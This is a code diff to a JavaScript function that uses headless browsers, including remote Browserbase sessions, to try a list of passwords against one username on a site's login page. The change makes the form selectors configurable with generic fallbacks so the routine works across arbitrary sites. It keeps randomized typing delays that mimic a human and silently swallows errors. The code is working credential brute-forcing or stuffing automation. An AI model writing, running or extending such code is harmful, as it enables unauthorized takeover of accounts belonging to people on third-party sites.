@@ -321,22 +321,38 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
     
     const url = `https://${host}/function?${params.toString()}`;
 
+    const userSel = site.username_selector || "input[type='email'], input[name='username']";
+    const passSel = site.password_selector || "input[type='password']";
+    const submitSel = site.submit_selector || "button[type='submit']";
+
     const code = `
       export default async ({ page }) => {
         const email = ${JSON.stringify(username)};
         const passwords = ${JSON.stringify(list)};
         const loginUrl = ${JSON.stringify(loginUrl)};
+        const userSel = ${JSON.stringify(userSel)};
+        const passSel = ${JSON.stringify(passSel)};
+        const submitSel = ${JSON.stringify(submitSel)};
         
         const started = Date.now();
         try {
           await page.goto(loginUrl, { waitUntil: 'networkidle' });
-          await page.waitForSelector('#loginSubmit', { state: 'visible' });
+          await page.waitForSelector(submitSel, { state: 'visible' }).catch(() => {});
 
           for (let i = 0; i < passwords.length; i++) {
             const pw = passwords[i];
-            await page.fill('#username', email, { delay: Math.floor(Math.random() * 100) + 50 });
-            await page.fill('#password', pw, { delay: Math.floor(Math.random() * 100) + 50 });
-            await page.click('#loginSubmit');
+            
+            // Try to clear fields
+            await page.evaluate(() => {
+              const ui = document.querySelector(${JSON.stringify(userSel)});
+              const pi = document.querySelector(${JSON.stringify(passSel)});
+              if (ui) ui.value = '';
+              if (pi) pi.value = '';
+            });
+
+            await page.fill(userSel, email, { delay: Math.floor(Math.random() * 100) + 50 }).catch(() => {});
+            await page.fill(passSel, pw, { delay: Math.floor(Math.random() * 100) + 50 }).catch(() => {});
+            await page.click(submitSel).catch(() => {});
             
             const waitTime = i === 0 ? 400 : 700;
             await page.waitForTimeout(waitTime);
@@ -387,11 +403,15 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
         browserWSEndpoint: `wss://connect.browserbase.com?apiKey=${credentials.bbApiKey}&sessionId=${sessionData.id}`,
       });
       
+      const userSel = site.username_selector || "input[type='email'], input[name='username']";
+      const passSel = site.password_selector || "input[type='password']";
+      const submitSel = site.submit_selector || "button[type='submit']";
+
       try {
         const page = await browser.newPage();
         await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
         try {
-          await page.waitForSelector('#loginSubmit', { visible: true, timeout: 10000 });
+          await page.waitForSelector(submitSel, { visible: true, timeout: 10000 });
         } catch (_) {
           // Ignore, we will try to type anyway if available
         }
@@ -399,19 +419,19 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
         for (let i = 0; i < list.length; i++) {
           const pw = list[i];
           // Clear fields if possible
-          await page.evaluate(() => {
-            const u = document.querySelector('#username');
-            const p = document.querySelector('#password');
+          await page.evaluate((uSel, pSel) => {
+            const u = document.querySelector(uSel);
+            const p = document.querySelector(pSel);
             if (u) u.value = '';
             if (p) p.value = '';
-          });
+          }, userSel, passSel);
 
-          await page.type('#username', username, { delay: 50 });
-          await page.type('#password', pw, { delay: 50 });
+          await page.type(userSel, username, { delay: 50 }).catch(() => {});
+          await page.type(passSel, pw, { delay: 50 }).catch(() => {});
           
           await Promise.all([
             page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {}),
-            page.click('#loginSubmit').catch(() => {})
+            page.click(submitSel).catch(() => {})
           ]);
           
           // Wait additional time for potential error messages to appear without navigation
